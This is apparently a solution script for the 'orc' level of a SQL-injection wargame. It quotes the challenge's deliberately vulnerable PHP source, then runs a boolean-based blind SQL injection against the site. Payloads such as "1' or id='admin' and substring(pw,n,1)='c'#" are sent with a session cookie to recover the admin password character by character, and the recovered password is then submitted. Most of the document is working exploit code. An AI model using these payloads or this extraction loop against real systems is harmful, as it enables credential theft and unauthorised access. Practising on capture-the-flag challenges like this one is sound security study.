import requests
import string
import time
"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
"""
url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
#payload = {"pw":"1' or '1'='1' and length(pw)=8#"}  #find out the length of password
password = ""
strings = string.printable
for i in range(8):
    for j in strings:
        payload = {"pw":"1' or id='admin' and substring(pw,"+str(i+1)+",1)= '"+j+"'#"}
        cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
        r = requests.get(url,params=payload,cookies=cookie)
        #print(r.text)
        if 'Hello admin' in r.text:
            password += j
            print("found {}".format(password))
            if len(password) == 8:
                payload = {"pw": password}
                r = requests.get(url,params=payload,cookies=cookie)
                if "Clear" in r.text:
                    print("clear")
                else:
                    print("try again")
            break
        time.sleep(0.5)